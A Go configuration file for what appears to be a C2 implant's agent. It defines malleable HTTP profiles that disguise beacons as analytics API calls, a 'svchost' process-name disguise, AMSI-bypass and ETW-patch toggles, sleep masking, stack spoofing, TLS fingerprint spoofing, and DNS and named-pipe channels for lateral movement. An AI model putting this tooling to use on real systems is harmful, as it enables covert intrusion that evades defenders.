package config

// AgentConfig 是 Agent 端配置。
type AgentConfig struct {
	ServerURL         string
	HeartbeatInterval int
	HeartbeatJitter   int
	ServerPubKeyPEM   string
	ProcessName       string
	UserAgent         string

	// Malleable Profile 相关
	Method        string            // HTTP 请求方法
	Path          string            // 请求路径
	Headers       map[string]string // 自定义请求头
	CookieName    string            // Cookie 字段名
	ParamName     string            // URL 参数名
	DataTransform string            // 数据编码：base64/base64-url/base58/hex/nop

	// Evasion 相关
	SleepMaskEnabled bool // Sleep 时是否启用内存混淆
	SyscallEnabled   bool // 是否使用间接 syscall
	AMSIEnabled      bool // AMSI 是否启用（false = bypass）
	ETWEnabled       bool // ETW 是否启用（false = patch）
	SleepTechnique   string // none/ekko/foliage
	StackSpoof       bool   // 是否启用调用栈欺骗
	TLSFingerprint   string // JA3/JA4 指纹配置（chrome_120/chrome_106/firefox_120/randomized）

	// Host Rotation
	ServerURLs    []string // 多服务器 URL（故障转移/轮换）
	RotationStrategy string // round-robin/random/failover

	// 传输类型
	TransportType string // http/websocket/dns/namedpipe

	// DNS C2 配置
	DNSDomain      string // C2 域名
	DNSNameserver  string // DNS 服务器
	DNSRecordType  string // TXT 或 A

	// Named Pipe C2 配置
	PipeName       string // 命名管道名称
	PipeRemoteHost string // 远程主机（横向移动）
	AgentID        string // Agent ID（DNS 传输需要）
}

// DefaultAgentConfig 返回 Agent 的默认配置。
func DefaultAgentConfig() *AgentConfig {
	return &AgentConfig{
		ServerURL:         "http://127.0.0.1:8443",
		HeartbeatInterval: 10,
		HeartbeatJitter:   5,
		ProcessName:       "svchost",
		UserAgent:         "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
		Method:            "POST",
		Path:              "/api/v1/analytics",
		Headers: map[string]string{
			"Accept":       "application/json",
			"Content-Type": "application/json",
		},
		CookieName:     "session_id",
		ParamName:      "data",
		DataTransform:  "base64",
		SleepMaskEnabled: false,
		SyscallEnabled:   false,
		AMSIEnabled:      true,
		ETWEnabled:       true,
		SleepTechnique:   "none",
		StackSpoof:       false,
		ServerURLs:       []string{"http://127.0.0.1:8443"},
		RotationStrategy: "failover",
		TransportType:    "http",
	}
}

// ApplyProfile 将 C2 Profile 的 HTTP 配置应用到 AgentConfig。
func (c *AgentConfig) ApplyProfile(method, path, userAgent string, headers map[string]string, dataTransform string) {
	c.Method = method
	c.Path = path
	c.UserAgent = userAgent
	c.Headers = headers
	c.DataTransform = dataTransform
}
